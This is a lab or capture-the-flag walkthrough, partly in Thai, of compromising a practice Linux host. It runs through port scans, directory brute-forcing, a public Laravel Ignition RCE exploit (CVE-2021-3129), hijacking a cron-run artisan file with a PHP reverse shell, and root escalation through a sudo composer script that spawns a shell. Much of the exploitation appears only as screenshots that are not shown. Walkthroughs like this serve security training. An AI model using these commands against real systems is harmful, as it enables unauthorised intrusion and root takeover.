# Recon 

## TCP Scan
```bash
 sudo ../tools/scan.sh 192.168.245.38 
[sudo] password for kali: 
[*] Running rustscan...
[*] Running nmap on ports: 22,80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 22:23 EDT
Nmap scan report for 192.168.245.38
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: W3.CSS Template
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds
```

## TCP 80 

![[Pasted image 20250701092719.png]]
![[Pasted image 20250701092639.png]]

เมื่อแก้ไข Host file เราจะสามารถเข้าถึงหน้าเว็บไซต์ปกติได้ ดังต่อไปนี้ 

![[Pasted image 20250701093002.png]]

ทดสอบทำให้เกิด Error จะพบว่าระบบมีการใช้ Laravel 8.4.0
![[Pasted image 20250701093458.png]]

![[Pasted image 20250701093557.png]]
เมื่อทดสอบแล้วไม่สามารถ Exploit สำเร็จ 

# Dir Brute
```bash
feroxbuster --url http://w3schools.com/ 
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://w3schools.com/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET      562l      921w    11956c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      312c http://w3schools.com/css => http://w3schools.com/css/
200      GET      115l      243w     4975c http://w3schools.com/register
301      GET        9l       28w      315c http://w3schools.com/images => http://w3schools.com/images/
301      GET        9l       28w      311c http://w3schools.com/js => http://w3schools.com/js/
405      GET       23l      106w      835c http://w3schools.com/logout
200      GET       90l      186w     3651c http://w3schools.com/password/reset
301      GET        9l       28w      316c http://w3schools.com/password/ => http://w3schools.com/password
200      GET      158l      990w    77842c http://w3schools.com/w3images/mountains.jpg
200      GET      540l     2524w   448161c http://w3schools.com/w3images/skunk.jpg
200      GET      699l     3401w   308915c http://w3schools.com/w3images/map.jpg
200      GET      722l     3492w   234216c http://w3schools.com/w3images/sailboat.jpg
301      GET        9l       28w      313c http://w3schools.com/w3css/ => http://w3schools.com/w3css
200      GET     9243l    18821w   181815c http://w3schools.com/css/app.css
200      GET      108l      562w    39338c http://w3schools.com/w3images/snow.jpg
200      GET       69l      531w    36002c http://w3schools.com/w3images/lights.jpg
200      GET     1651l     8219w  1926531c http://w3schools.com/w3images/flex.jpg
200      GET      114l      233w     4909c http://w3schools.com/login
200      GET      163l      916w    64831c http://w3schools.com/w3images/ringo.png
302      GET       12l       22w      350c http://w3schools.com/home => http://w3schools.com/login
301      GET        9l       28w      319c http://w3schools.com/javascript => http://w3schools.com/javascript/
200      GET        0l        0w  1552814c http://w3schools.com/js/app.js
200      GET        0l        0w  1388484c http://w3schools.com/w3images/ringo2.jpg
200      GET      328l     1030w    15137c http://w3schools.com/
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      326c http://w3schools.com/javascript/jquery => http://w3schools.com/javascript/jquery/
200      GET    10870l    44283w   287600c http://w3schools.com/javascript/jquery/jquery
404      GET        0l        0w        0c http://w3schools.com/js/WFS
404      GET        0l        0w        0c http://w3schools.com/images/bus
404      GET        0l        0w        0c http://w3schools.com/images/myAccount
404      GET        0l        0w        0c http://w3schools.com/images/newthread
404      GET        0l        0w        0c http://w3schools.com/Storage
404      GET        0l        0w        0c http://w3schools.com/images/MyAdmin
302      GET       12l       22w      350c http://w3schools.com/image-upload => http://w3schools.com/login
[####################] - 5m    180040/180040  0s      found:32      errors:7      
[####################] - 5m     30000/30000   92/s    http://w3schools.com/ 
[####################] - 5m     30000/30000   92/s    http://w3schools.com/css/ 
[####################] - 5m     30000/30000   92/s    http://w3schools.com/images/ 
[####################] - 5m     30000/30000   93/s    http://w3schools.com/js/ 
[####################] - 2m     30000/30000   262/s   http://w3schools.com/javascript/ 
[####################] - 2m     30000/30000   247/s   http://w3schools.com/javascript/jquery/          
```

จากข้อมูลข้างต้นจะพบกว่า /register ให้ทำการทดสอบ Register user และเข้าสู่ระบบ
![[Pasted image 20250701115244.png]]

จากข้อมูลข้างต้นทำให้เราเห็นว่ามีการปิดใช้งาน Debug อยู่ และเราสามารถเปิดได้ 

```bash
dirsearch -u http://w3schools.com
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/reports/http_w3schools.com/_25-07-01_00-49-26.txt

Target: http://w3schools.com/

[00:49:26] Starting: 
[00:49:26] 301 -  311B  - /js  ->  http://w3schools.com/js/                 
[00:49:29] 403 -  278B  - /.htaccess.bak1                                   
[00:49:29] 403 -  278B  - /.ht_wsr.txt                                      
[00:49:29] 403 -  278B  - /.htaccess_orig                                   
[00:49:29] 403 -  278B  - /.htaccessOLD                                     
[00:49:29] 403 -  278B  - /.htm                                             
[00:49:29] 403 -  278B  - /.html
[00:49:29] 403 -  278B  - /.htpasswd_test                                   
[00:49:29] 403 -  278B  - /.htpasswds
[00:49:29] 403 -  278B  - /.httr-oauth
[00:49:29] 403 -  278B  - /.htaccess.orig                                   
[00:49:29] 403 -  278B  - /.htaccess.sample                                 
[00:49:29] 403 -  278B  - /.htaccess.save
[00:49:29] 403 -  278B  - /.htaccess_extra                                  
[00:49:29] 403 -  278B  - /.htaccess_sc                                     
[00:49:29] 403 -  278B  - /.htaccessBAK
[00:49:29] 403 -  278B  - /.htaccessOLD2
[00:49:30] 403 -  278B  - /.php                                             
[00:49:33] 405 -  835B  - /_ignition/execute-solution                       
[00:49:46] 301 -  312B  - /css  ->  http://w3schools.com/css/               
[00:49:49] 200 -    0B  - /favicon.ico                                      
[00:49:51] 302 -  350B  - /home  ->  http://w3schools.com/login             
[00:49:51] 403 -  278B  - /images/                                          
[00:49:51] 301 -  315B  - /images  ->  http://w3schools.com/images/
[00:49:52] 301 -  319B  - /javascript  ->  http://w3schools.com/javascript/ 
[00:49:52] 404 -  275B  - /javascript/editors/fckeditor                     
[00:49:52] 404 -  275B  - /javascript/tiny_mce                              
[00:49:52] 403 -  278B  - /js/                                              
[00:49:54] 200 -    5KB - /login                                            
[00:49:54] 405 -  835B  - /logout                                           
[00:50:02] 200 -    5KB - /register                                         
[00:50:02] 200 -   24B  - /robots.txt                                       
[00:50:03] 403 -  278B  - /server-status                                    
[00:50:03] 403 -  278B  - /server-status/                                   
[00:50:09] 200 -    1KB - /web.config                                       

```

จากนั้นทดสอบเข้าไปที่ `http://w3schools.com/_ignition/execute-solution` 
โดย URL ดังกล่าวจะนำไปใช้สำหรับทำ Exploit สำหรับทำ RCE บน laravel 

![[Pasted image 20250701115822.png]]

# Exploit web using payload 

![[Pasted image 20250701120426.png]]

https://github.com/joshuavanderpoll/CVE-2021-3129.git

![[Pasted image 20250701120552.png]]

![[Pasted image 20250701120653.png]]

# Shell as www-data 

![[Pasted image 20250701122259.png]]

# process monitor 

```bash
chmod +x pspy32s 
timeout 30s ./pspy32s 
```
![[Pasted image 20250701123624.png]]

จะเห็นว่ามีการรัน `/use/bin/php /var/www/html/lavita/artisan clear:picture` ซึ่งเราสามารถ Replace `artisan` ได้ โดยการใส่ php reverse shell ไปแทนที่ 

# Shell as skunk

![[Pasted image 20250701124132.png]]

```bash
sudo -l
Matching Defaults entries for skunk on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User skunk may run the following commands on debian:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita *

```

ตรวจสอบใน GTFObins จะพบว่าสามารถใช้ Composer ได้ 

![[Pasted image 20250701125534.png]]

```bash
# user skunk ไม่มีสิทธิในการเขียนไฟล์เราจะต้องเขียนไฟล์จาก www-data เพื่อสร้าง shell ที่ไฟล์ composer.json และสร้าง x scripts ภายใต้นั้น
cp composer.json composer.json.bak  
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json  
# จากนั้นรัน Shell ด้วย shunk ก็จะสามารถ Exploit ไปเป็น Root ได้   
sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x
```

![[Pasted image 20250701125502.png]]

# PWN 